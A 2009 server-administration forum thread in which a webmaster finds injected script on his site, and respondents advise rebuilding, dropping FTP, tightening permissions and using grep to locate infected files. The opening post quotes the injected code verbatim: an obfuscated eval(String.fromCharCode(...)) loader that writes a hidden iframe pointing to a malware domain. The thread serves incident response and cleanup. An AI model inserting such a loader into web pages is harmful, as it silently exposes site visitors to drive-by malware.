---
title: "Security problem... urgent help needed"
date: 2009-05-11
forum: Server Platforms
---

### Post by wattaman on 2009-05-11
Hi!
I have an urgent problem if anyone can give me an advice, I'd apreciate it.
I've recently noticed a javascript implemented in some of my site's pages. The code is:
> <script type="text/javascript">eval(String.fromCharCode(118,97,114,32,116,61,53,59,118,97,114,32,104,106,103,52,61,34,119,111,108,108,34,59,118,97,114,32,119,61,34,97,110,99,101,34,59,118,97,114,32,114,101,54,61,34,46,34,59,118,97,114,32,114,114,116,116,54,61,34,99,111,109,34,59,118,97,114,32,97,61,34,105,102,34,59,118,97,114,32,115,61,34,116,116,34,59,100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,39,43,97,43,39,114,97,109,101,32,115,114,99,61,34,104,39,43,115,43,39,112,58,47,47,39,43,104,106,103,52,43,39,39,43,119,43,39,39,43,114,101,54,43,39,39,43,114,114,116,116,54,43,39,47,39,43,39,34,32,119,105,100,116,104,61,34,49,34,32,104,101,105,103,104,116,61,34,51,34,62,60,47,105,39,43,39,102,39,43,39,114,97,109,101,62,39,41,59,118,97,114,32,119,54,61,56,55,52,57,56,48,48,48,48,48,50,51,52,48))</script>

After decoding, you can see is a frame trying to load the site wollance.com, which warn the antispyware that, most of the time, locks the browser.
I honestly don't know if my computer is infected or my ubuntu server is infected and somehow writes this script in my pages from time to time, so I need an advice.
IF the server is infected, where should I look for the problem and, most important, how to fix it? I'm totally lost.

---

### Post by wattaman on 2009-05-11
K. is the server... made some digging and it appears that is an Ukrainean server involved in this. Also, I found this [http://www.wizcrafts.net/blogs/2009/05/block_ukrainian_malware_server_on_eurohost.html](http://www.wizcrafts.net/blogs/2009/05/block_ukrainian_malware_server_on_eurohost.html) that confirms it.

Still, have no ideea how to fix this.

My server has deny hosts installed and clamav. I'm not sure what clamav does, to be honest; can I use it to search/clean infection or to point to vulnerabilities? Also, what I don't understand: are my files modified on the server or the script is inserted when the page is generated? 

Please help me, I have no ideea how to fix it :confused:
Thanks!

---

### Post by ikonia on 2009-05-11
if your machine has been compromised in any way, 

you should destory the OS and rebuild it, fixing the security hole second time around.

if your machine is compromised in any way there is no real way of knowing what was done

---

### Post by wattaman on 2009-05-11
> **ikonia said:**
> if your machine has been compromised in any way, 

you should destory the OS and rebuild it, fixing the security hole second time around.

if your machine is compromised in any way there is no real way of knowing what was done

Can't afford to. It costs money and, more important, time offline. Besides, where's the security hole?! :confused:
Isn't there any tool that can scan and find the security threads for ubuntu servers?

---

### Post by Qchan on 2009-05-11
[b][color=darkred]
Wattaman. Sounds to me that your website was a victim of an XSS attack. I could be dead wrong, but usually XSS attacks involve scripts such as this.

The best thing to do is fix the XSS vulnerability. There are several ways you can do this depending on your set up.

If your server was really hijacked, then you'd probably notice more than just scripts on your site. Be sure to check your logs for any suspicious activity. Run back ups of your home folder and prepare a complete wipe, just encase.

Good luck!
[/b][/color]

---

### Post by wattaman on 2009-05-11
Yeah, I've googled this (XSS) and I think the same. After I've read about it, it seems that this is happening due to a non-safe script I'm using. I suppose all I can do is to start searching it.
I was hopping there's a software that can do this automatically, since I'm not such an expert in this things :(
I'll keep this open, maybe someone can give me other suggestions on this.
Thx!

---

### Post by wattaman on 2009-05-11
K, the only vulnerable script I found on my server was _prismotube 2_. I have it installed on 2 subdomains that I've set now to redirect to another site.

However, I still don't understand how the XSS works.
Q: Those pages on my sites that contain the malicious javascript have been modified and I have to edit them to clean them?!
or
Q: Now, that the security hole (hoping it was only prismotube) is fixed, the problem is been fixed and the javascript code will not appear anymore?
and also, more like a temporary solution: is there something I can do, on the server side, so the encoded javascript won't insert or load into my sites pages?
Thx

Forgot to ask if there's an utility or a script that can scan the site files codes and delete the javascript automatically - like a normal search/replace in a text editor, only for an entire folder, so it will do them all at once.

---

### Post by ikonia on 2009-05-12
the reason I said re-install is because nothing can be trusted.

You machine has been compromised at the webserver level - I don't know how/what the security hole is, however you/I don't know what else has happened to this box, putting tools and checking for things is usless on a known compromised machine, for example it's common to change the binary ps - this means when do you do a ps to see what processes are running it shows all - except the hidden one that the person running the exploit has put on (just an example).

Nothing can be trusted, putting more tools on an untrusted box make no different.

Yes rebuilding costs time and money, but it's down to you to weigh up what is more important the servers long term use and security, or the cost of a rebuild/downtime,

Keep in mind that if you don't know what's been exploited you could find yourself in a mess, eg: your box could be sending out spam mail that will get you blacklisted on mail hosts - which is in effect mail down time  - so it's up to you how you manage the threat.

---

### Post by wattaman on 2009-05-18
K. I found the problem... I think.
the reinstall is still out of the question, until I'm sure I'm right, anyway. I think I got that stupid trojan that steals FTP details and then replaces the index files with its own versions (e.g. those containing the script above).
Untill I'll check the server again (and again, and.. offf!) I've disabled FTP access.
What I'm looking for is a script that will search in all the files from a particular folder (/home/) and delete the script above.
_Does anyone knows of such script and how to use it?_
I found some information here: [http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/comment-page-1/](http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/comment-page-1/) but haven't understood too much.
Thanks!

---

### Post by HermanAB on 2009-05-18
Howdy,

These kind of problems are ALWAYS due to some kool d00d using a stupid password.  You absolutely have to implement password checks to ensure that all users always use strong passwords.

Also, FTP is insecure and should not be used on a public network with username/password login.  The only way to secure FTP is to allow anonymous downloads only.  You should use SSH for secure transfers and remote administration.

---

### Post by wattaman on 2009-05-18
You haven't read the article, did you?! Besides, all my passwords looks like this: sgsE$T^$WGTBzsae4%^YUJ^&567wt. Is not about brute force here.

Anyway, regarding to my issue, I repet myself:
_Does anyone know of a script that searches inside files and deletes a particular code (=*the injected script, of course*) and how to use it?_

---

### Post by windependence on 2009-05-18
Ummmm.... I agree with Herman here. Also, I think before you think about getting back online you need to read up a bit on security. Like Herman told you, FTP should not be used on your site if you value it at all. Use WinSCP or something else that you know is secure. Which brings me to another point. You need to audit any code you get from someone else. Many times these scripts contain malicious code such as the code that was inserted in your site. Even if you write your own code (and I suspect you don't). you still need to audit it yourself or better yet, have someone else do it BEFORE you go live on the web. 

What is your site that you can't take a few hours to reload your machine? The point was correct that once your machine is compromised, you should completely wipe it and restore from a good clean backup - you DO have backup, don't you? What about a good hardware firewall (not on your machine)? There are many things you need to consider to do a professional web site.

-Tim

---

### Post by wattaman on 2009-05-18
> once your machine is compromised, you should completely wipe it and restore from a good clean backup
Yeah, heard that before... when it will come to this, I'll gladelly switch back to Windows - until then, I'lets just assume (and hope) ia only this: [http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/comment-page-1/](http://linuxsysadminblog.com/2009/03/heurtrojanscriptiframe/comment-page-1/)
Now, for the name of God:
_Does anyone know of a script that searches inside files and deletes a particular code and also how to use it?_ Or at least to write a list of those files.

---

### Post by windependence on 2009-05-18
Well, it isn't a virus, it's a script injection, and if you had correct permssions on your script files you might not have had this problem.

BTW, he tells you right in the blog how to find the infected files:

```
grep -Z -R "eval(String.fromCharCode(118,97,114" /path/to/site/* >> affected_file_list.txt
```

What directory are you using as the root of your web server?

-Tim

---

### Post by wattaman on 2009-05-18
Yap, figured it out, after all. I was confused 'cause using the *grep* command on the entire home directory takes a lot of time and I was thinking the putty is crashing or something.
I've tested it on a smaller directory and it works fine.
Now, I'm asking this because I don't understand entirelly how _grep_ works: _Is there a way to teel it to skip scanning files that can't contain the script_ (lile pictures, music, flash etc.)?
Thanks!

BTW, haven't understood the perl script part. Maybe you can explain better how to use it. If I think a little, maybe a cronjob to run all the *search and replace* wouldn't be a bad idea.

---

### Post by windependence on 2009-05-19
You can use the --exclude option to skip processing any files or directories matching a specific pattern

There's a new option, &#8211;exclude-dir in grep 2.5.3 (grep &#8211;version), so you can exclude entire directories that way. If you have questions, do a ```
man grep
```BTW, you can avoid all this by making your web content read only to everyone except root


-Tim

---

### Post by wattaman on 2009-05-19
> **windependence said:**
> 
BTW, you can avoid all this by making your web content read only to everyone except root

I know, but not all scripts will like this.
Can you please post the full example of command that will exclude picture files from scanning?
The *man grep* gives me an error: *bash: man: command not found*

---

### Post by windependence on 2009-05-19
There are other ways to allow scripts to write where they need to, including having them run as an unprivileged user. 

For grep, your path is messed up. Here is some info:

[https://help.ubuntu.com/community/grep](https://help.ubuntu.com/community/grep)

You could try ```
/usr/bin/man grep
```

More useful info:

[http://stackoverflow.com/questions/221921/grep-exclude-include-syntax-do-not-grep-through-certain-files](http://stackoverflow.com/questions/221921/grep-exclude-include-syntax-do-not-grep-through-certain-files)

[http://www.linuxquestions.org/questions/linux-general-1/using-find-and-grep-how-to-exclude-a-result-231242/](http://www.linuxquestions.org/questions/linux-general-1/using-find-and-grep-how-to-exclude-a-result-231242/)

[http://www.shell-fu.org/lister.php?tag=grep](http://www.shell-fu.org/lister.php?tag=grep)

[http://www.gnu.org/software/grep/doc/grep_13.html#SEC13](http://www.gnu.org/software/grep/doc/grep_13.html#SEC13)

HTH

-Tim

---

### Post by windependence on 2009-05-19
Here is some good info on Apache security including how to safely run your scripts:

[http://httpd.apache.org/docs/2.2/misc/security_tips.html](http://httpd.apache.org/docs/2.2/misc/security_tips.html)

-Tim

---

### Post by wattaman on 2009-05-19
> **windependence said:**
> Here is some good info on Apache security including how to safely run your scripts:

[http://httpd.apache.org/docs/2.2/misc/security_tips.html](http://httpd.apache.org/docs/2.2/misc/security_tips.html)

-Tim

K, I think that security tips made it even more blur for me.
Just to check if I got it right: is it a good thing to asign all the files/folder to root or not?!

---

### Post by wattaman on 2009-05-21
Sorry, I need to know this last thing:

- Is it better to assign all the /home/ folder content (files&folders) to root (instead of the owner > site.com, site2.com etc)?

---

